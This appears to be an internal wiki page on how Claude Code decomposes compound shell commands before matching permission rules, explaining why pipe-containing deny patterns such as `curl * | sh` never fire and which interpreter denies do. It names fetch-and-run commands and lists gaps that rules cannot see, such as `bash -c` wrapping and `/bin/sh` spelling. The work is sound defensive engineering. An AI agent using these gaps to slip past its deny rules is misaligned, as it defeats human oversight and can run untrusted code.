---
id: per-subcommand-decomposition
title: Per-Subcommand Decomposition
aliases: [compound command splitting, subcommand matching, pipe rules never fire]
updated: 2026-07-29
sources:
  - ../../../raw/research/deny-rules-vs-hooks/index.md
  - ../../../raw/research/agent-sandbox-escape-vectors/index.md
confidence: extracted
tags: [security, claude-code, permissions, deny-list, matching]
---

# Per-Subcommand Decomposition

Before matching any `Bash(...)` permission rule, Claude Code **splits the command line into subcommands** on `&&`, `||`, `;`, `|`, `|&`, `&`, and newlines, then matches **each subcommand independently**. This one mechanic explains most of what is otherwise surprising about `Bash(...)` rule behaviour, in both directions.

**The decisive evidence** is not the matching doc but the *rule-generation* doc: approving `git status && npm test` causes Claude Code to save a rule for **`npm test`** — not for the compound string — "so future `npm test` invocations are recognized regardless of what precedes the `&&`". A system that emits one rule per subcommand must be matching per subcommand; the generated rule would otherwise never fire. Two further doc statements corroborate: the separator list is given verbatim with "A rule must match each subcommand independently", and the PowerShell section spells out that pipes specifically split. Denies decompose too, not just allows — the docs describe deny operating on the same normalized form ("`Bash(rm *)` in deny still matches `FOO=bar rm -rf tmp/`").

## Consequence 1: a pipe-containing pattern can never fire

`Bash(curl * | sh*)` is **permanently unmatchable**. Matching runs against subcommands, and a subcommand by construction never contains the separator that delimited it. The pattern is syntactically valid, loads without error, and enforces nothing.

**There is no startup warning for this.** The documented warning set covers untrusted-workspace allow entries, unmatched *file-path* patterns, parameter rules on a primary content field, and tool-name typos — not a Bash command pattern that cannot match. So **absence of a warning is not evidence a rule is live**, and there is no static validation to lean on: correctness comes from understanding the matcher. This is the reason `lib/scripts/templates/settings-deny.json` must keep pipe-containing patterns permanently out, with a comment saying why, so nobody re-proposes them. relates_to::[[settings-deny-list]]

## Consequence 2: a bare interpreter deny *does* fire

Because `curl https://x | sh` decomposes to `curl https://x` + `sh`, a bare `Bash(sh)` deny matches the second subcommand — which is the useful half. The same holds for `bash`, `zsh`, `python`, `python3`, `node`, `ruby`, `perl`, and `sh -s*` / `bash -s*`. False positives are near zero: a bare interpreter invoked from a tool call opens a REPL that would hang, and real usage (`bash -n`, `node script.js`, `python3 -m pytest`) is untouched. Process-substitution rules (`Bash(bash <*)`, `Bash(sh <*)`, `Bash(zsh <*)`, `Bash(node <*)`) are higher-confidence still — no separator, one subcommand, direct match — and do not depend on this mechanism at all.

## What it does not fix

Decomposition gives you the *shape* of the command line, never its *contents*. A subcommand is still an opaque string: `bash -c '<anything>'` is one subcommand, and no pattern sees inside it. Absolute-path spelling (`/bin/sh`) is a different subcommand than `sh`. The pipeline *shape* — "a fetcher piped into an interpreter" — is exactly what a rule structurally cannot express, and is the one place a PreToolUse hook genuinely wins, because `tool_input.command` hands the hook the **raw, undecomposed** string. derived_from::[[deny-matches-a-spelling-not-a-capability]], relates_to::[[three-tier-agent-control-model]], relates_to::[[claude-code-permission-system]].

*Honest residual: no primary source shows a literal `Bash(sh)` deny blocking a literal `curl x | sh` in practice. This is a well-supported deduction from documented behaviour, not an observed test — the `echo hi | sh` UAT in implements::[[TASK-026]] exists to confirm it.*
